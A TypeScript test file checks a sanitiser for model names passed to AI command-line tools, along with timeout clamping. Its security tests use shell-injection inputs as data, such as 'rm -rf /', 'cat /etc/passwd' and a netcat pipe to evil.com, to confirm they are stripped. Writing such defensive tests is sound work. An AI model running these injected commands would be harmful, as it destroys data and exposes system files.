/**
 * Co-located tests for commands.ts
 */
import { describe, it, expect } from 'vitest';
import {
  buildClaudeCommand,
  buildCodexCommand,
  buildGeminiCommand,
  sanitiseModelName,
  validateTimeout,
} from './commands.js';

describe('commands exports', () => {
  it('exports buildClaudeCommand', () => expect(buildClaudeCommand).toBeDefined());
  it('exports buildCodexCommand', () => expect(buildCodexCommand).toBeDefined());
  it('exports buildGeminiCommand', () => expect(buildGeminiCommand).toBeDefined());
});

describe('sanitiseModelName security', () => {
  it('strips shell metacharacters (;, &, |, /, spaces)', () => {
    // Semicolon, spaces, slashes stripped; hyphens preserved
    expect(sanitiseModelName('model; rm -rf /')).toBe('modelrm-rf');
    expect(sanitiseModelName('model && cat /etc/passwd')).toBe('modelcatetcpasswd');
    expect(sanitiseModelName('model | nc evil.com 1234')).toBe('modelncevil.com1234');
  });

  it('preserves hyphens (valid in model names) but strips spaces', () => {
    expect(sanitiseModelName('model --extra-flag')).toBe('model--extra-flag');
    expect(sanitiseModelName('model -x')).toBe('model-x');
  });

  it('strips newline characters', () => {
    expect(sanitiseModelName('model\n--malicious-flag')).toBe('model--malicious-flag');
    expect(sanitiseModelName('model\r\n--flag')).toBe('model--flag');
  });

  it('allows safe characters (alphanumeric, dots, hyphens, underscores, colons)', () => {
    expect(sanitiseModelName('gpt-5.2-codex')).toBe('gpt-5.2-codex');
    expect(sanitiseModelName('gemini-2.5-pro-exp-03-25')).toBe('gemini-2.5-pro-exp-03-25');
    expect(sanitiseModelName('gpt-oss:120b-cloud')).toBe('gpt-oss:120b-cloud');
    expect(sanitiseModelName('model_name_v2')).toBe('model_name_v2');
  });

  it('truncates excessively long model names', () => {
    const longName = 'a'.repeat(200);
    expect(sanitiseModelName(longName).length).toBe(100);
  });
});

describe('validateTimeout bounds', () => {
  it('clamps below minimum (5s) to minimum', () => {
    expect(validateTimeout(1000)).toBe(5000);
    expect(validateTimeout(0)).toBe(5000);
    expect(validateTimeout(-1000)).toBe(5000);
  });

  it('clamps above maximum (5min) to maximum', () => {
    expect(validateTimeout(600000)).toBe(300000);
    expect(validateTimeout(1000000)).toBe(300000);
  });

  it('allows values within bounds', () => {
    expect(validateTimeout(30000)).toBe(30000);
    expect(validateTimeout(120000)).toBe(120000);
    expect(validateTimeout(5000)).toBe(5000);
    expect(validateTimeout(300000)).toBe(300000);
  });
});
